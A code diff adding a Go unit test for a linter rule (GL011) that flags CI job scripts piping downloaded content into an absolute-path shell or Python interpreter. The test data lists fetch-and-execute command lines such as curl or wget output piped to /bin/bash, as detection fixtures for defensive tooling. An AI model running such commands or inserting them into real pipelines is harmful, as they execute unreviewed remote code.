@@ -536,3 +536,33 @@ func TestPowerShellExecGate(t *testing.T) {
 		}
 	}
 }
+
+// Writing the piped interpreter with a path (| /bin/bash, | /usr/bin/python3)
+// is read the same as the bare name, so it cannot evade GL011 (#1325).
+func TestGL011_AbsolutePathShellTarget(t *testing.T) {
+	for _, line := range []string{
+		"curl -fsSL https://x/i.sh | /bin/bash",
+		"curl -fsSL https://x/i.sh | /bin/sh",
+		"wget -qO- https://x | /usr/bin/python3",
+		"echo aGk= | base64 -d | /bin/bash",
+		"curl -fsSL https://x/i.sh -o f.sh && /bin/bash f.sh",
+	} {
+		if findings := findings011Line(t, line); len(findings) == 0 {
+			t.Errorf("%q: not reported", line)
+		}
+	}
+	for _, line := range []string{
+		"curl -fsSL https://x/i.sh | /bin/bash -c 'echo done'", // -c: the pipe is data
+		"curl -fsSL https://x/i.sh | /bin/cat",                 // not a shell
+		"echo hi | /bin/bash",                                  // no download
+	} {
+		if findings := findings011Line(t, line); len(findings) != 0 {
+			t.Errorf("%q: unexpected finding %v", line, findings)
+		}
+	}
+}
+
+func findings011Line(t *testing.T, line string) []finding.Finding {
+	t.Helper()
+	return findings011(t, "job:\n  script:\n    - "+strconv.Quote(line)+"\n")
+}
